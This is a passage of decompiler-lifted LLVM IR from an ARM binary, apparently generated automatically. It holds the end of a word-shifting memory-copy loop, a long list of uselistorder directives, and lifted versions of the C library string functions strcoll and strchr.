  %v6_19090 = load i32, i32* @r5, align 4
  %v8_19090 = inttoptr i32 %v6_19090 to i8*
  store i8* %v8_19090, i8** %stack_var_-8, align 4
  %v11_19090 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19094

dec_label_pc_19094:                               ; preds = %dec_label_pc_19094.dec_label_pc_19094_crit_edge, %dec_label_pc_1908c
  %v0_190b8 = phi i32 [ %v1_190b8, %dec_label_pc_19094.dec_label_pc_19094_crit_edge ], [ %v0_18fe019, %dec_label_pc_1908c ]
  %v0_19098 = phi i32 [ %v0_19098.pre, %dec_label_pc_19094.dec_label_pc_19094_crit_edge ], [ %v1_18f98, %dec_label_pc_1908c ]
  %v0_19094 = phi i32 [ %v0_19094.pre, %dec_label_pc_19094.dec_label_pc_19094_crit_edge ], [ %v2_18f9c, %dec_label_pc_1908c ]
  %v3_19094 = mul i32 %v0_19094, 16777216
  store i32 %v3_19094, i32* %lr.global-to-local, align 4
  %v1_19098 = add i32 %v0_19098, -4
  %v2_19098 = inttoptr i32 %v1_19098 to i32*
  %v3_19098 = load i32, i32* %v2_19098, align 4
  store i32 %v3_19098, i32* @r3, align 4
  %v4_19098 = add i32 %v0_19098, -8
  %v5_19098 = inttoptr i32 %v4_19098 to i32*
  %v6_19098 = load i32, i32* %v5_19098, align 4
  store i32 %v6_19098, i32* %r4.global-to-local, align 4
  %v7_19098 = add i32 %v0_19098, -12
  %v8_19098 = inttoptr i32 %v7_19098 to i32*
  %v9_19098 = load i32, i32* %v8_19098, align 4
  store i32 %v9_19098, i32* %r5.global-to-local, align 4
  %v10_19098 = add i32 %v0_19098, -16
  %v11_19098 = inttoptr i32 %v10_19098 to i32*
  %v12_19098 = load i32, i32* %v11_19098, align 4
  store i32 %v10_19098, i32* %r1.global-to-local, align 4
  %v4_1909c = udiv i32 %v12_19098, 256
  %v5_1909c = or i32 %v4_1909c, %v3_19094
  store i32 %v5_1909c, i32* %lr.global-to-local, align 4
  %v3_190a0 = mul i32 %v12_19098, 16777216
  %v4_190a4 = udiv i32 %v9_19098, 256
  %v5_190a4 = or i32 %v3_190a0, %v4_190a4
  store i32 %v5_190a4, i32* @ip, align 4
  %v3_190a8 = mul i32 %v9_19098, 16777216
  %v4_190ac = udiv i32 %v6_19098, 256
  %v5_190ac = or i32 %v3_190a8, %v4_190ac
  store i32 %v5_190ac, i32* %r5.global-to-local, align 4
  %v3_190b0 = mul i32 %v6_19098, 16777216
  %v4_190b4 = udiv i32 %v3_19098, 256
  %v5_190b4 = or i32 %v3_190b0, %v4_190b4
  store i32 %v5_190b4, i32* %r4.global-to-local, align 4
  %v1_190b8 = add i32 %v0_190b8, -16
  %v2_190b8 = inttoptr i32 %v1_190b8 to i32*
  store i32 %v5_190b4, i32* %v2_190b8, align 4
  %v4_190b8 = add i32 %v0_190b8, -12
  %v5_190b8 = inttoptr i32 %v4_190b8 to i32*
  %v6_190b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_190b8, i32* %v5_190b8, align 4
  %v7_190b8 = add i32 %v0_190b8, -8
  %v8_190b8 = inttoptr i32 %v7_190b8 to i32*
  %v9_190b8 = load i32, i32* @ip, align 4
  store i32 %v9_190b8, i32* %v8_190b8, align 4
  %v10_190b8 = add i32 %v0_190b8, -4
  %v11_190b8 = inttoptr i32 %v10_190b8 to i32*
  %v12_190b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_190b8, i32* %v11_190b8, align 4
  store i32 %v1_190b8, i32* %r0.global-to-local, align 4
  %v0_190bc = load i32, i32* %r2.global-to-local, align 4
  %v2_190bc = add i32 %v0_190bc, -16
  store i32 %v2_190bc, i32* %r2.global-to-local, align 4
  %v6_190c0 = icmp slt i32 %v0_190bc, 16
  br i1 %v6_190c0, label %dec_label_pc_190c4, label %dec_label_pc_19094.dec_label_pc_19094_crit_edge

dec_label_pc_19094.dec_label_pc_19094_crit_edge:  ; preds = %dec_label_pc_19094
  %v0_19094.pre = load i32, i32* @r3, align 4
  %v0_19098.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19094

dec_label_pc_190c4:                               ; preds = %dec_label_pc_19094
  %v2_190c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_190c4, i32* @r4, align 4
  %v5_190c4 = load i8*, i8** %stack_var_-8, align 4
  %v6_190c4 = ptrtoint i8* %v5_190c4 to i32
  store i32 %v6_190c4, i32* @r5, align 4
  store i32 %v11_19090, i32* @lr, align 4
  %v2_190c8 = add i32 %v0_190bc, -4
  store i32 %v2_190c8, i32* %r2.global-to-local, align 4
  %v4_190c8 = add i32 %v0_190bc, 2147483632
  %v5_190c8 = and i32 %v2_190c8, %v4_190c8
  %v6_190c8 = icmp slt i32 %v5_190c8, 0
  store i1 %v6_190c8, i1* %cpsr_v.global-to-local, align 1
  %v7_190c8 = icmp slt i32 %v2_190c8, 0
  store i1 %v7_190c8, i1* %cpsr_n.global-to-local, align 1
  %v8_190c8 = icmp eq i32 %v2_190c8, 0
  store i1 %v8_190c8, i1* %cpsr_z.global-to-local, align 1
  %v5_190cc = icmp slt i32 %v2_190bc, -12
  br i1 %v5_190cc, label %dec_label_pc_190e8, label %dec_label_pc_190d0

dec_label_pc_190d0:                               ; preds = %dec_label_pc_190c4, %dec_label_pc_19084, %dec_label_pc_190d0
  %v1_190dc = phi i32 [ %v5_190dc, %dec_label_pc_190d0 ], [ %v1_190b8, %dec_label_pc_190c4 ], [ %v0_18fe019, %dec_label_pc_19084 ]
  %v0_190d0 = load i32, i32* @r3, align 4
  %v3_190d0 = mul i32 %v0_190d0, 16777216
  store i32 %v3_190d0, i32* %ip.global-to-local, align 4
  %v0_190d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_190d4 = add i32 %v0_190d4, -4
  %v2_190d4 = inttoptr i32 %v1_190d4 to i32*
  %v3_190d4 = load i32, i32* %v2_190d4, align 4
  store i32 %v3_190d4, i32* @r3, align 4
  store i32 %v1_190d4, i32* %r1.global-to-local, align 4
  %v4_190d8 = udiv i32 %v3_190d4, 256
  %v5_190d8 = or i32 %v4_190d8, %v3_190d0
  store i32 %v5_190d8, i32* @ip, align 4
  %v2_190dc = add i32 %v1_190dc, -4
  %v3_190dc = inttoptr i32 %v2_190dc to i32*
  store i32 %v5_190d8, i32* %v3_190dc, align 4
  %v4_190dc = load i32, i32* %r0.global-to-local, align 4
  %v5_190dc = add i32 %v4_190dc, -4
  store i32 %v5_190dc, i32* %r0.global-to-local, align 4
  %v0_190e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_190e0 = add i32 %v0_190e0, -4
  store i32 %v2_190e0, i32* %r2.global-to-local, align 4
  %v6_190e4 = icmp slt i32 %v0_190e0, 4
  br i1 %v6_190e4, label %dec_label_pc_190e8.loopexit, label %dec_label_pc_190d0

dec_label_pc_190e8.loopexit:                      ; preds = %dec_label_pc_190d0
  %v4_190e0 = sub i32 3, %v0_190e0
  %v5_190e0 = and i32 %v4_190e0, %v0_190e0
  %v6_190e0 = icmp slt i32 %v5_190e0, 0
  %v7_190e0 = icmp slt i32 %v2_190e0, 0
  store i1 %v6_190e0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_190e0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_190e8

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190e8.loopexit, %dec_label_pc_190c4
  %v2_18f5453 = phi i32 [ %v5_190dc, %dec_label_pc_190e8.loopexit ], [ %v1_190b8, %dec_label_pc_190c4 ]
  %v0_18f4449 = phi i32 [ %v2_190e0, %dec_label_pc_190e8.loopexit ], [ %v2_190c8, %dec_label_pc_190c4 ]
  %v0_190e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_190e8 = add i32 %v0_190e8, 1
  store i32 %v1_190e8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_190dc, { 0, 2, 1 }
  uselistorder i32 %v3_190d0, { 1, 0 }
  uselistorder i32 %v2_190c8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_190b8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_19098, { 1, 0 }
  uselistorder i32 %v3_19094, { 1, 0 }
  uselistorder i32 %v0_19098, { 3, 2, 1, 0 }
  uselistorder i32 %v0_190b8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19070, { 0, 2, 1 }
  uselistorder i32 %v3_19064, { 1, 0 }
  uselistorder i32 %v2_1905c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1904c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1902c, { 1, 0 }
  uselistorder i32 %v3_19028, { 1, 0 }
  uselistorder i32 %v0_1902c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1904c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19004, { 0, 2, 1 }
  uselistorder i32 %v3_18ff8, { 1, 0 }
  uselistorder i32 %v2_18ff0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18fe0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18fc0, { 1, 0 }
  uselistorder i32 %v3_18fbc, { 1, 0 }
  uselistorder i32 %v0_18fc0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18fe0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_19088, { 2, 0, 1 }
  uselistorder i32 %v0_18fa0, { 1, 0 }
  uselistorder i32 %v0_1908c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_18fe019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18f90, { 2, 1, 0 }
  uselistorder i32 %v0_18f90, { 2, 0, 1 }
  uselistorder i32 %v2_18f88, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18f88, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18f88, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_18fe020, { 2, 1, 0 }
  uselistorder i32 %v11_18f64, { 1, 0 }
  uselistorder i32 %v7_18f64, { 1, 0 }
  uselistorder i32 %v1_18f44, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18f44, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18f48, { 1, 0 }
  uselistorder i32 %v7_18f3c, { 0, 2, 1 }
  uselistorder i32 %v10_18f38, { 1, 0 }
  uselistorder i32 %v9_18f30, { 1, 0, 2 }
  uselistorder i32 %v6_18f2c, { 1, 0 }
  uselistorder i32 %v2_18f24, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_18f24, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_18f34, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18f18, { 0, 2, 1 }
  uselistorder i32 %v13_18f14, { 1, 0 }
  uselistorder i32 %v4_18f10, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_18f10, { 2, 0, 1 }
  uselistorder i32 %v6_18f18, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18f08, { 0, 2, 1 }
  uselistorder i32 %v16_18f04, { 1, 0 }
  uselistorder i32 %v4_18f00, { 1, 2, 0 }
  uselistorder i32 %v0_18f10.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18f08, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18ef4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_18ef0, { 1, 0 }
  uselistorder i32 %v1_18eec, { 1, 0 }
  uselistorder i32 %v10_18ee8, { 1, 0 }
  uselistorder i32 %v0_18ee8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18eec, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_18ee0, { 0, 2, 1 }
  uselistorder i32 %v2_18ed4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18ed4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_18eec37, { 1, 2, 0 }
  uselistorder i32 %v1_18ecc, { 2, 1, 0 }
  uselistorder i32 %v1_18ec4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_18ebc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18eb8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18eb4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18eb4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_18ea4, { 0, 2, 1 }
  uselistorder i32 %v4_18ea0, { 1, 0 }
  uselistorder i32 %v3_18e94, { 1, 0 }
  uselistorder i32 %v1_18e8c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18e80, { 1, 0 }
  uselistorder i32 %v12_18e7c, { 0, 2, 1 }
  uselistorder i32 %v8_18e5c, { 1, 0, 2 }
  uselistorder i32 %v5_18e5c, { 1, 0, 2 }
  uselistorder i32 %v2_18e5c, { 1, 0, 2 }
  uselistorder i32 %v0_18e5c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18e7c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18e38, { 0, 2, 1 }
  uselistorder i32 %v4_18e34, { 1, 0 }
  uselistorder i32 %v3_18e28, { 1, 0 }
  uselistorder i32 %v1_18e20, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18e14, { 1, 0 }
  uselistorder i32 %v12_18e10, { 0, 2, 1 }
  uselistorder i32 %v8_18df0, { 1, 0, 2 }
  uselistorder i32 %v5_18df0, { 1, 0, 2 }
  uselistorder i32 %v2_18df0, { 1, 0, 2 }
  uselistorder i32 %v0_18df0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18e10, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18dcc, { 0, 2, 1 }
  uselistorder i32 %v4_18dc8, { 1, 0 }
  uselistorder i32 %v3_18dbc, { 1, 0 }
  uselistorder i32 %v1_18db4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18da8, { 1, 0 }
  uselistorder i32 %v12_18da4, { 0, 2, 1 }
  uselistorder i32 %v8_18d84, { 1, 0, 2 }
  uselistorder i32 %v5_18d84, { 1, 0, 2 }
  uselistorder i32 %v2_18d84, { 1, 0, 2 }
  uselistorder i32 %v0_18d84, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18da4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_18de0, { 0, 2, 1 }
  uselistorder i32 %v1_18ddc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_18d60, { 2, 0, 1, 3 }
  uselistorder i32 %v2_18d60, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18de4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_18e7c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_18d54, { 1, 0 }
  uselistorder i32 %v0_18d54, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18d4c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_18d4c, { 1, 0, 2 }
  uselistorder i32 %v0_18d4c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18e7c77, { 1, 0 }
  uselistorder i32 %v1_18d2c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_18d34, { 1, 0 }
  uselistorder i32 %v0_18d08, { 3, 0, 1, 2 }
  uselistorder i32 %v1_18cfc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_18ce8, { 1, 0, 2 }
  uselistorder i32 %v1_18ce4, { 1, 0 }
  uselistorder i32 %v1_18cdc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_18cdc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18cd4, { 0, 2, 1 }
  uselistorder i32 %v3_18cd4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_18cd4, { 1, 0 }
  uselistorder i1 %v1_18cd4, { 1, 0 }
  uselistorder i32 %v3_18cd0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18cc8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18cb4, { 1, 2, 0 }
  uselistorder i32 %v1_18cac, { 0, 2, 1 }
  uselistorder i32 %v12_18ca8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_18c9c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18ca0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_18c90, { 0, 2, 1 }
  uselistorder i32 %v1_18c88, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18c88, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_18c80, { 1, 0 }
  uselistorder i32 %v1_18c78, { 2, 1, 0 }
  uselistorder i32 %v2_18c70, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_18c70, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_18c6c, { 1, 0 }
  uselistorder i32 %v2_18c60, { 1, 0 }
  uselistorder i32 %v1_18c60, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_18c60, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 7, 3, 9, 4, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 6, 21, 22, 23, 24, 25, 5, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 2, 7, 3, 9, 4, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 6, 21, 22, 23, 5, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 2, 7, 3, 9, 4, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 6, 22, 23, 24, 25, 26, 5, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 6, 5 }
  uselistorder i32 27, { 1, 0, 2, 6, 3, 7, 4, 8, 5, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 60, 61, 62, 6, 18, 19, 20, 63, 64, 65, 7, 21, 22, 23, 66, 67, 68, 8, 24, 25, 69, 16, 15, 70, 71, 72, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 73, 10, 33, 41, 42, 43, 9, 44, 45, 46, 34, 40, 2, 35, 47, 48, 49, 50, 51, 52, 0, 1, 53, 54, 55, 56, 57, 58, 59, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_190d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19064, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18ff8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18f98, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_18f24, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_18ee8, { 1, 0 }
  uselistorder label %dec_label_pc_18ed4, { 1, 0 }
  uselistorder label %dec_label_pc_18e94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18e28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18dbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18d5c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_18d2c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_18cc8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_18c88, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_190f4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_190f4 = phi i32 [ %v0_190f4.pre, %bb ], [ %v5_190f4, %bb3 ]
  %v0_190f0 = phi i32 [ %tmp, %bb ], [ %v5_190f0, %bb3 ]
  %v1_190f0 = inttoptr i32 %v0_190f0 to i8*
  %v2_190f0 = load i8, i8* %v1_190f0, align 1
  %v1_190f4 = inttoptr i32 %v0_190f4 to i8*
  %v2_190f4 = load i8, i8* %v1_190f4, align 1
  %v3_190f4 = zext i8 %v2_190f4 to i32
  %v2_190f8 = icmp eq i8 %v2_190f0, 0
  br i1 %v2_190f8, label %.dec_label_pc_19104_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_190f4 = add i32 %v0_190f4, 1
  %v5_190f0 = add i32 %v0_190f0, 1
  %v3_190f0 = zext i8 %v2_190f0 to i32
  %v10_190fc = icmp eq i8 %v2_190f0, %v2_190f4
  br i1 %v10_190fc, label %entry, label %dec_label_pc_19104

.dec_label_pc_19104_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_19104

dec_label_pc_19104:                               ; preds = %bb3, %.dec_label_pc_19104_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_19104_crit_edge ], [ %v3_190f0, %bb3 ]
  %v2_19104.pre-phi = sub nsw i32 %.pn, %v3_190f4
  ret i32 %v2_19104.pre-phi

; uselistorder directives
  uselistorder i8 %v2_190f0, { 0, 2, 1 }
  uselistorder i32 %v0_190f0, { 1, 0 }
  uselistorder i32 %v0_190f4, { 1, 0 }
  uselistorder label %dec_label_pc_19104, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_19174 = urem i32 %arg1, 256
  %v0_191943 = load i32, i32* @r0, align 4
  %v1_191944 = urem i32 %v0_191943, 4
  %v2_191945 = icmp eq i32 %v1_191944, 0
  br i1 %v2_191945, label %dec_label_pc_1919c, label %dec_label_pc_1917c

dec_label_pc_1917c:                               ; preds = %entry, %dec_label_pc_19190
  %v0_19190 = phi i32 [ %v1_19190, %dec_label_pc_19190 ], [ %v0_191943, %entry ]
  %v1_1917c = inttoptr i32 %v0_19190 to i8*
  %v2_1917c = load i8, i8* %v1_1917c, align 1
  %v3_1917c = zext i8 %v2_1917c to i32
  %v9_19180 = icmp eq i32 %v3_1917c, %v1_19174
  br i1 %v9_19180, label %dec_label_pc_19250, label %dec_label_pc_19188

dec_label_pc_19188:                               ; preds = %dec_label_pc_1917c
  %v2_19188 = icmp eq i8 %v2_1917c, 0
  br i1 %v2_19188, label %dec_label_pc_1924c, label %dec_label_pc_19190

dec_label_pc_19190:                               ; preds = %dec_label_pc_19188
  %v1_19190 = add i32 %v0_19190, 1
  %v1_19194 = urem i32 %v1_19190, 4
  %v2_19194 = icmp eq i32 %v1_19194, 0
  br i1 %v2_19194, label %dec_label_pc_1919c, label %dec_label_pc_1917c

dec_label_pc_1919c:                               ; preds = %dec_label_pc_19190, %entry
  %v0_191a0 = phi i32 [ %v0_191943, %entry ], [ %v1_19190, %dec_label_pc_19190 ]
  %v4_1919c = mul nuw nsw i32 %v1_19174, 256
  %v5_1919c = or i32 %v4_1919c, %v1_19174
  %v4_191a4 = mul i32 %v5_1919c, 65536
  %v5_191a4 = or i32 %v4_191a4, %v5_1919c
  br label %dec_label_pc_191a8

dec_label_pc_191a8:                               ; preds = %dec_label_pc_19244, %dec_label_pc_191e4, %dec_label_pc_1919c
  %v0_1920c = phi i32 [ %v0_191a0, %dec_label_pc_1919c ], [ %v4_191a8, %dec_label_pc_191e4 ], [ %v4_191a8, %dec_label_pc_19244 ]
  %v1_191a8 = inttoptr i32 %v0_1920c to i32*
  %v2_191a8 = load i32, i32* %v1_191a8, align 4
  %v4_191a8 = add i32 %v0_1920c, 4
  %v2_191b0 = xor i32 %v2_191a8, %v5_191a4
  %v2_191bc = add i32 %v2_191a8, 2130640639
  %v1_191c0 = sub i32 -1, %v2_191a8
  %v2_191c4 = xor i32 %v2_191bc, %v1_191c0
  %v2_191d0 = and i32 %v2_191c4, -2130640640
  store i32 %v2_191d0, i32* @r1, align 4
  %v2_191d8 = icmp eq i32 %v2_191d0, 0
  br i1 %v2_191d8, label %dec_label_pc_191e4, label %dec_label_pc_191ec

dec_label_pc_191e4:                               ; preds = %dec_label_pc_191a8
  %v2_191b4 = add i32 %v2_191b0, 2130640639
  %v1_191cc = sub i32 -1, %v2_191b0
  %v2_191d4 = xor i32 %v2_191b4, %v1_191cc
  %v2_191dc = and i32 %v2_191d4, -2130640640
  %v2_191e4 = icmp eq i32 %v2_191dc, 0
  br i1 %v2_191e4, label %dec_label_pc_191a8, label %dec_label_pc_191ec

dec_label_pc_191ec:                               ; preds = %dec_label_pc_191a8, %dec_label_pc_191e4
  %v2_191ec = inttoptr i32 %v0_1920c to i8*
  %v3_191ec = load i8, i8* %v2_191ec, align 1
  %v4_191ec = zext i8 %v3_191ec to i32
  %v9_191f0 = icmp eq i32 %v4_191ec, %v1_19174
  br i1 %v9_191f0, label %dec_label_pc_19250, label %dec_label_pc_191fc

dec_label_pc_191fc:                               ; preds = %dec_label_pc_191ec
  %v2_191fc = icmp eq i8 %v3_191ec, 0
  br i1 %v2_191fc, label %dec_label_pc_1924c, label %dec_label_pc_19204

dec_label_pc_19204:                               ; preds = %dec_label_pc_191fc
  %v1_19204 = add i32 %v0_1920c, 1
  %v2_19204 = inttoptr i32 %v1_19204 to i8*
  %v3_19204 = load i8, i8* %v2_19204, align 1
  %v4_19204 = zext i8 %v3_19204 to i32
  %v9_19208 = icmp eq i32 %v4_19204, %v1_19174
  br i1 %v9_19208, label %dec_label_pc_19250, label %dec_label_pc_19214

dec_label_pc_19214:                               ; preds = %dec_label_pc_19204
  %v2_19214 = icmp eq i8 %v3_19204, 0
  br i1 %v2_19214, label %dec_label_pc_1924c, label %dec_label_pc_1921c

dec_label_pc_1921c:                               ; preds = %dec_label_pc_19214
  %v1_1921c = add i32 %v0_1920c, 2
  %v2_1921c = inttoptr i32 %v1_1921c to i8*
  %v3_1921c = load i8, i8* %v2_1921c, align 1
  %v4_1921c = zext i8 %v3_1921c to i32
  %v9_19220 = icmp eq i32 %v4_1921c, %v1_19174
  br i1 %v9_19220, label %dec_label_pc_19250, label %dec_label_pc_1922c

dec_label_pc_1922c:                               ; preds = %dec_label_pc_1921c
  %v2_1922c = icmp eq i8 %v3_1921c, 0
  br i1 %v2_1922c, label %dec_label_pc_1924c, label %dec_label_pc_19234

dec_label_pc_19234:                               ; preds = %dec_label_pc_1922c
  %v1_19234 = add i32 %v0_1920c, 3
  %v2_19234 = inttoptr i32 %v1_19234 to i8*
  %v3_19234 = load i8, i8* %v2_19234, align 1
  %v4_19234 = zext i8 %v3_19234 to i32
  %v9_19238 = icmp eq i32 %v4_19234, %v1_19174
  br i1 %v9_19238, label %dec_label_pc_19250, label %dec_label_pc_19244

dec_label_pc_19244:                               ; preds = %dec_label_pc_19234
  %v2_19244 = icmp eq i8 %v3_19234, 0
  br i1 %v2_19244, label %dec_label_pc_1924c, label %dec_label_pc_191a8

